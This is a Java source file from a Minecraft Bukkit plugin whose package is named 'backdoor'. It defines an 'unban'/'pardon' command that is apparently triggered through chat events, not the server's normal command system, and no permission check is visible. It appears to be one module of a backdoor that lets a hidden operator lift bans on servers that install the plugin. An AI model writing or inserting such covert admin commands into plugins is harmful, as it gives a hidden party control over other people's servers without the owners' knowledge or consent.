package me.tsb.backdoor.commands.bans;

import me.tsb.backdoor.Command;
import me.tsb.backdoor.RegisterCommand;
import me.tsb.plugin.Main;
import org.bukkit.BanList;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.event.player.PlayerChatEvent;

import java.util.ArrayList;

@RegisterCommand(displayName = "unban", aliases = {"unban", "pardon"})
public class UnBanCommand extends Command {

    private final Main main;

    public UnBanCommand (Main main) {
        this.main = main;
    }

    @Override
    public void onExec(PlayerChatEvent event, ArrayList<String> args) {

        if (args.size() >= 1) {
            if (Bukkit.getBanList(BanList.Type.NAME).isBanned(args.get(0))) {

                Bukkit.getBanList(BanList.Type.NAME).pardon(args.get(0));

            } else event.getPlayer().sendMessage(ChatColor.RED + "This person is not banned!\nDid you use the UUID?");
        }
    }
}
